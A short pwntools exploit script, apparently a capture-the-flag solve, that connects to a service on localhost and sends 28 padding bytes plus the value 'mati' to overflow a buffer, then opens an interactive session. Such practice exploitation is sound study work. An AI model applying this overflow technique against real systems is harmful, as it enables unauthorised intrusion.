from pwn import *

context.terminal = ["alacritty","-e"]
p = remote("localhost",6666)
# p = process("./main")
p.sendline(b"A"*28+b"mati")
p.interactive()
